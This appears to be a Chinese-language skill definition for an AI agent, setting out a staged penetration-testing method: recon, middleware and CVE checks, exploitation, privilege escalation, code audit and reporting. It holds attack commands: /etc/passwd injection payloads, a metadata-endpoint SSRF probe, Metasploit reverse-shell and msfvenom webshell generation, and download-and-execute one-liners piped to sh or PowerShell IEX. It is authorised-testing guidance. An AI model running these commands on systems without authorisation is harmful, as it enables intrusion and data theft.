---
name: penetration-testing
description: 提供系统性渗透测试能力；当你需要进行网络安全评估、漏洞挖掘、权限提升或生成渗透测试报告时使用
---

# 渗透测试技能

## 任务目标
- 本Skill用于：对目标系统进行授权的安全评估与漏洞验证
- 能力包含：信息收集、漏洞检测(含中间件/CVE)、漏洞利用、权限提升、代码审计、报告生成
- 触发条件：用户表达渗透测试、安全评估、漏洞验证、渗透报告等意图

## 核心原则
- 仅对**已授权目标**进行测试
- 测试前确认授权范围和时间窗口
- 遵循安全测试规范，避免造成业务中断
- 所有操作需有清晰的测试目的和预期结果

## 操作流程

### 阶段一：信息收集

#### 1.1 被动信息收集

```bash
# 子域名发现
amass enum -passive -d target.com
subfinder -d target.com

# OSINT
theHarvester -d target.com -b all

# 公开数据源
shodan search ip:target_ip
```

#### 1.2 主动信息收集

```bash
# 端口扫描
nmap -p- -sV -O target.com -oA full_scan

# 服务枚举
whatweb target.com
nikto -h https://target.com
enum4linux target.com
```

### 阶段二：漏洞检测

#### 2.1 Web应用漏洞

| 漏洞类型 | 检测命令 |
|---------|---------|
| SQL注入 | `sqlmap -u "url" --batch --level=5` |
| XSS | `xsstrike -u "url"` |
| SSRF | 测试内网地址 `http://169.254.169.254/` |
| RCE | `; whoami`, `\| cat /etc/passwd` |
| LFI | `../../etc/passwd` |

#### 2.2 中间件漏洞检测

**Web服务器**:
```bash
curl -I https://target.com
nmap --script http-apache* target.com
searchsploit apache
```

**应用服务器**:
```bash
# Tomcat
curl -I http://target.com:8080
nmap --script http-tomcat* target.com -p 8080

# JBoss
nmap --script=jboss* target.com

# WebLogic
nmap --script weblogic* target.com -p 7001
```

**缓存/消息队列**:
```bash
# Redis未授权
redis-cli -h target.com info
# Memcached
nc -vn target.com 11211
# RabbitMQ
curl -u guest:guest http://target.com:15672/api/overview
```

**容器编排**:
```bash
curl http://target.com:2375/version  # Docker API
curl -k https://target.com:6443/api/v1  # Kubernetes API
```

#### 2.3 CVE漏洞检测

**版本获取后查询**:
```bash
openssl version
apache2 -v
nginx -v
java -version
```

**CVE扫描**:
```bash
nmap --script=cve*.nse target.com
nmap --script=vuln target.com
nmap --script=cve-2021-44228 target.com  # Log4Shell
nmap --script=cve-2022-22965 target.com  # Spring4Shell
```

**常用Exploit搜索**:
```bash
searchsploit "Apache 2.4.49"
searchsploit "Spring Framework"
searchsploit "Redis 6.0"
searchsploit "Docker"
```

**高危CVE速查**:

| 服务 | CVE | 影响 |
|------|-----|------|
| Apache | CVE-2021-42013 | RCE |
| Log4j | CVE-2021-44228 | RCE |
| Spring | CVE-2022-22965 | RCE |
| Redis | CVE-2022-0543 | 沙箱逃逸 |
| SMB | CVE-2017-0144 | 永恒之蓝 |
| Docker | CVE-2022-0492 | 容器逃逸 |

详细CVE信息见 [references/middleware-cve.md](references/middleware-cve.md)

#### 2.4 服务漏洞

```bash
msfconsole -q -x "search name:mysql; use auxiliary/scanner/mysql/mysql_version; set RHOSTS target.com; run"
searchsploit service_name version
```

### 阶段三：漏洞利用

```bash
# Metasploit
msfconsole
search exploit_name
use exploit/path/to/exploit
set payload generic/shell_reverse_tcp
exploit

# Webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPORT=port -f raw > shell.php

# SQL注入利用
sqlmap -u "url" --batch --dbs
```

### 阶段四：权限提升

#### Linux提权

```bash
# 信息收集
uname -a
sudo -l
cat /etc/crontab

# Sudo滥用
sudo -l
sudo vim -c '!sh'

# SUID提权
find / -perm -4000 -type f 2>/dev/null

# 内核漏洞
uname -r
searchsploit "Linux Kernel" | grep $(uname -r | cut -d. -f1-2)

# 自动化枚举
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### Windows提权

```powershell
systeminfo
whoami /all
wmic qfe list
powershell -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')"
```

### 阶段五：代码审计(无漏洞时执行)

当常规扫描未发现明显漏洞时，进入代码审计阶段。

#### 5.1 代码获取

```bash
git-dumper http://target.com/.git /tmp/source
svn checkout svn://target.com/.svn /tmp/source
wget http://target.com/backup.zip
```

#### 5.2 危险函数搜索

```bash
# PHP
grep -rn "eval\|system\|exec\|mysql_query\|unserialize" --include="*.php"

# Java
grep -rn "executeQuery\|Runtime.exec\|ObjectInputStream" --include="*.java"

# Python
grep -rn "execute\|system\|eval\|pickle.loads" --include="*.py"
```

#### 5.3 审计关注点

| 类型 | 关注点 |
|------|--------|
| SQL注入 | 字符串拼接、窄过滤、伪过滤 |
| 命令注入 | 用户输入进入exec/system/eval |
| 文件操作 | 路径穿越、NULL字节、编码绕过 |
| 反序列化 | 可控输入进入unserialize/readObject |
| 业务逻辑 | 认证绕过、越权、条件竞争、金额篡改、流程跳过 |

#### 5.4 自动化工具

```bash
semgrep --config=p/security audits /path     # 多语言
bandit -r ./python_project/               # Python
nuclei -t cves/ -u https://target.com     # CVE扫描
```

详细审计指南见 [references/code-audit.md](references/code-audit.md)

### 阶段六：报告生成

#### 报告结构

```
# 渗透测试报告
## 1. 执行摘要
## 2. 测试范围
## 3. 测试方法
## 4. 漏洞详情(CVE/CWE、等级、复现步骤、影响、修复建议)
## 5. 操作证据
## 6. 结论与建议
```

#### 漏洞定级

| 等级 | 标准 |
|------|------|
| Critical | 可直接获取系统最高权限 |
| High | 可获取敏感数据或提升权限 |
| Medium | 可造成业务影响 |
| Low | 信息泄露或轻微影响 |
| Info | 情报收集 |

## 使用示例

### 示例1: Web应用渗透测试
- 场景: 授权测试 https://testapp.example.com
- 流程: 信息收集 → 中间件检测 → CVE扫描 → Web漏洞 → 代码审计 → 报告

### 示例2: 内网渗透
- 场景: 已获得DMZ服务器Shell
- 流程: 内网信息收集 → CVE扫描 → 横向移动 → 域控拿下 → 报告

### 示例3: 代码审计
- 场景: 常规扫描无发现，需深度审计
- 流程: 获取源码 → 危险函数搜索 → 业务逻辑分析 → 漏洞报告

## 资源索引
- 参考: 见 [references/tools-commands.md](references/tools-commands.md)(工具速查)
- 参考: 见 [references/vulnerability-checklist.md](references/vulnerability-checklist.md)(漏洞检查清单)
- 参考: 见 [references/middleware-cve.md](references/middleware-cve.md)(中间件与CVE速查)
- 参考: 见 [references/code-audit.md](references/code-audit.md)(代码审计指南)

## 注意事项
- 始终确保测试授权，避免未授权扫描
- 高风险操作前评估业务影响
- 敏感数据处理需符合数据安全规范
- 报告需脱敏处理后再交付
